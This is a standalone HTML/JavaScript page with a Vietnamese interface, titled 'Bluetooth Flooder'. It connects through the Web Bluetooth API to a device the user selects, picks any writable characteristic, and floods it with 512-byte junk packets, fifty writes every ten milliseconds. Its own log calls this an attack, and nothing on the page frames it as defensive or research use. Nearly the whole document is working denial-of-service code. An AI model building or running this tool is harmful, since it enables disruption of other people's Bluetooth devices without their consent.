<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bluetooth Flooder</title>
    <style>
        body {
            background: #0a0a0a;
            color: #0f0;
            font-family: 'Courier New', monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        h1 {
            text-shadow: 0 0 10px #0f0;
            border-bottom: 2px solid #0f0;
            padding-bottom: 10px;
        }
        #log {
            width: 90%;
            max-width: 600px;
            height: 300px;
            background: #111;
            border: 1px solid #0f0;
            overflow-y: auto;
            padding: 10px;
            font-size: 12px;
            margin: 20px 0;
            white-space: pre-wrap;
            word-break: break-all;
        }
        button {
            background: #0f0;
            color: #000;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin: 5px;
            border-radius: 5px;
            box-shadow: 0 0 15px #0f0;
            transition: all 0.2s;
        }
        button:hover {
            background: #fff;
            box-shadow: 0 0 25px #fff;
        }
        button:disabled {
            background: #333;
            color: #666;
            box-shadow: none;
            cursor: not-allowed;
        }
        .danger {
            background: #f00;
            box-shadow: 0 0 15px #f00;
        }
        .danger:hover {
            background: #fff;
            box-shadow: 0 0 25px #f00;
        }
        #status {
            font-size: 14px;
            margin-top: 10px;
            color: #ff0;
        }
    </style>
</head>
<body>
    <h1>⚡ BLUETOOTH FLOODER ⚡</h1>
    <div id="status">Trạng thái: Chờ lệnh...</div>
    <div id="log"></div>
    <div>
        <button id="startBtn">BẮT ĐẦU SPAM</button>
        <button id="stopBtn" class="danger" disabled>DỪNG LẠI</button>
    </div>

    <script>
        const logEl = document.getElementById('log');
        const statusEl = document.getElementById('status');
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');

        let isRunning = false;
        let floodInterval = null;
        let device = null;
        let server = null;
        let characteristic = null;

        function log(msg) {
            const time = new Date().toLocaleTimeString();
            logEl.textContent += `[${time}] ${msg}\n`;
            logEl.scrollTop = logEl.scrollHeight;
        }

        // Dịch vụ Bluetooth Serial Port Profile (SPP) - UUID phổ biến
        const SPP_SERVICE_UUID = '00001101-0000-1000-8000-00805f9b34fb';
        // Đặc trưng để gửi dữ liệu (tuỳ thiết bị, thường dùng để ghi)
        const WRITE_CHAR_UUID = '00001101-0000-1000-8000-00805f9b34fb';

        async function connectAndFlood() {
            try {
                log('Đang yêu cầu kết nối Bluetooth...');
                device = await navigator.bluetooth.requestDevice({
                    acceptAllDevices: true,
                    optionalServices: [SPP_SERVICE_UUID]
                });

                log(`Đã chọn thiết bị: ${device.name || 'Không tên'} (${device.id})`);

                device.addEventListener('gattserverdisconnected', onDisconnected);

                log('Đang kết nối GATT server...');
                server = await device.gatt.connect();
                log('Đã kết nối GATT server.');

                // Thử lấy service SPP
                let service;
                try {
                    service = await server.getPrimaryService(SPP_SERVICE_UUID);
                    log('Đã lấy service SPP.');
                } catch (e) {
                    log('Không tìm thấy service SPP, thử service bất kỳ...');
                    const services = await server.getPrimaryServices();
                    if (services.length === 0) throw new Error('Không có service nào.');
                    service = services[0];
                    log(`Dùng service: ${service.uuid}`);
                }

                // Lấy characteristic để ghi
                const characteristics = await service.getCharacteristics();
                if (characteristics.length === 0) throw new Error('Không có characteristic.');
                characteristic = characteristics.find(c => c.properties.write || c.properties.writeWithoutResponse) || characteristics[0];
                log(`Dùng characteristic: ${characteristic.uuid}`);

                // Bắt đầu spam
                isRunning = true;
                startBtn.disabled = true;
                stopBtn.disabled = false;
                statusEl.textContent = 'Trạng thái: ĐANG SPAM...';
                log('🔥 BẮT ĐẦU SPAM GÓI TIN BLUETOOTH 🔥');

                const payload = new TextEncoder().encode('X'.repeat(512)); // gói 512 byte

                floodInterval = setInterval(async () => {
                    if (!isRunning || !characteristic) return;
                    try {
                        // Gửi liên tục nhiều gói trong mỗi tick
                        for (let i = 0; i < 50; i++) {
                            if (!isRunning) break;
                            await characteristic.writeValue(payload);
                        }
                        log(`Đã gửi 50 gói (${payload.length} byte/gói)`);
                    } catch (err) {
                        log(`Lỗi gửi: ${err.message}`);
                    }
                }, 10); // mỗi 10ms

            } catch (err) {
                log(`❌ Lỗi: ${err.message}`);
                statusEl.textContent = 'Trạng thái: Lỗi kết nối.';
                cleanup();
            }
        }

        function onDisconnected() {
            log('⚠️ Thiết bị đã ngắt kết nối.');
            cleanup();
        }

        function stopFlood() {
            isRunning = false;
            if (floodInterval) {
                clearInterval(floodInterval);
                floodInterval = null;
            }
            if (server && server.connected) {
                server.disconnect();
            }
            cleanup();
            log('🛑 Đã dừng spam.');
            statusEl.textContent = 'Trạng thái: Đã dừng.';
        }

        function cleanup() {
            isRunning = false;
            if (floodInterval) {
                clearInterval(floodInterval);
                floodInterval = null;
            }
            startBtn.disabled = false;
            stopBtn.disabled = true;
            characteristic = null;
            server = null;
            device = null;
        }

        startBtn.addEventListener('click', connectAndFlood);
        stopBtn.addEventListener('click', stopFlood);

        // Kiểm tra hỗ trợ Web Bluetooth
        if (!navigator.bluetooth) {
            log('❌ Trình duyệt không hỗ trợ Web Bluetooth API.');
            log('Hãy dùng Chrome/Edge trên desktop hoặc Android.');
            startBtn.disabled = true;
        } else {
            log('✅ Web Bluetooth API khả dụng.');
            log('Nhấn "BẮT ĐẦU SPAM" để chọn thiết bị và tấn công.');
        }
    </script>
</body>
</html>
